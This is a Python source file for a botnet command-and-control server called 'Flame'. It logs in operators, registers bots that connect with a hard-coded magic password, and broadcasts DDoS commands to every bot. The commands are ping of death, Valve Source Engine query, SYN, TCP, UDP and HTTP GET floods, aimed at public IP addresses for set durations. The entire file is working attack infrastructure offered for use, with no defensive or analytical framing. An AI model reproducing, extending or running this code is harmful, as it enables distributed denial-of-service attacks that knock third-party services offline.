import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init
from pathlib import Path
import json

bots = {}
ansi_clear = '\033[2J\033[H'

banner = f'''
\x1b[3;31;40m                  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
\x1b[3;31;40m                  ┃ ███████╗██╗░░░░░░█████╗░███╗░░░███╗███████╗ ┃
\x1b[3;31;40m                  ┃ ██╔════╝██║░░░░░██╔══██╗████╗░████║██╔════╝ ┃
\x1b[3;31;40m                  ┃ █████╗░░██║░░░░░███████║██╔████╔██║█████╗░░ ┃
\x1b[3;31;40m                  ┃ ██╔══╝░░██║░░░░░██╔══██║██║╚██╔╝██║██╔══╝░░ ┃
\x1b[3;31;40m                  ┃ ██║░░░░░███████╗██║░░██║██║░╚═╝░██║███████╗ ┃
\x1b[3;31;40m                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ \x1b[1;30;40m-V0.3\x1b[0m
\x1b[3;31;40m                  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
        '''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    """ read credentials from logins file """
    credentials = [x.strip() for x in open(f'{Path(__file__).parent.absolute()}\logins.+').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split('--')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)

        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;Flame | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, '\x1b[3;31;40m'+x)
    opened = 0
    if (opened == 0):
        send(client, "Type .HELP to get started(Not case sensitive)\r\n", False)

    prompt = f'\x1b[3;31;40mFlame \x1b[3;33;40m$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            if command.upper() == '.HELP':
                send(client, '.HELP: Shows list of commands')
                send(client, '.CLEAR: Clears the screen')
                send(client, '.LOGOUT: Disconnects from server')
                send(client, '.BOTS: Displays info of connected bots.')
                send(client, '.DEATH_PING [Target IP] [Packets to send]: Sends a ping of death to a target.')
                send(client, '')

            elif command.upper() == '.CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command.upper() == '.LOGOUT':
                send(client, 'Cya')
                time.sleep(1)
                break

            elif command.upper() == '.BOTS':
                if (len(args) ==3):
                    if (args[2].lower() == "simple"):
                        for bot in bots.keys():
                            send(bot, 'INFO_REQUEST_SIMPLE', False, False)
                            if (args[1].lower() == "console"):
                                send(client, bot.recv(1024).decode())
                            elif (args[1].lower() == "file"):
                                with open("bots.txt", "a+") as bf: #bf means bots file
                                    bf.write(bot.recv(1024).decode() + '\n')
                            else:
                                sent = 0
                                if (sent == 0):
                                    send(client, "arg one was not console nor file, the output will not be saved anywhere")
                                    sent += 1
                                else:
                                    pass
                    elif (args[2].lower() == "advanced"):
                        for bot in bots.keys():
                            send(bot, 'INFO_REQUEST_ADVANCED', False, False)
                            if (args[1].lower() == "console"):
                                send(client, bot.recv(1024).decode())
                            elif (args[1].lower() == "file"):
                                try:
                                    with open("bots.txt", "a+") as bf: #bf means bots file
                                        bf.write(bot.recv(1024).decode() + '\n')
                                except Exception as e:
                                    print(e)
                            else:
                                sent = 0
                                if (sent == 0):
                                    send(client, "arg one was not console nor file, the output will not be saved anywhere")
                                    sent += 1
                                else:
                                    pass
                    else:
                        send(client, "Mode is not advanced nor simple")
                else:
                    send(client, "This command takes two args, [console\\file] [simple\\advanced]")

            elif command.upper() == ".DEATH_PING":
                if (len(args) == 3):
                    ip_ = args[1]
                    packets_ = args[2]
                    if (validate_ip(ip_)):
                        for bot in bots.keys():
                            send(bot, f'DEATH_PING{ip_}||{packets_}')
                        if (len(bots) == 1):
                            send(client, "Attack sent to 1 bot")
                        else:
                            send(client, f"Attack sent to {len(bots)} bots")
                    else:
                        send(client, "Invalid IP")

            # Valve Source Engine query flood
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')

            # TCP SYNchronize flood
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')

            # TCP junk data packets flood
            elif command == '.TCP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')

            # UDP junk data packets flood
            elif command == '.UDP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')

            # HTTP GET request flood
            elif command == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')

            elif command.upper() == 'DEV.COLORS':
                try:
                    for style in range(8):
                        for fg in range(30,38):
                            s1 = ''
                            for bg in range(40,48):
                                format = ';'.join([str(style), str(fg), str(bg)])
                                s1 += '\x1b[%sm %s \x1b[0m' % (format, format)
                            send(client, s1)
                        send(client, '\r\n')
                except Exception as e:
                    print(e)

            else:
                send(client, "Invalid command")

            send(client, prompt, False)

        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Flame | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b[3;31;40mUsername{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b[3;31;40mPassword{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break

    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
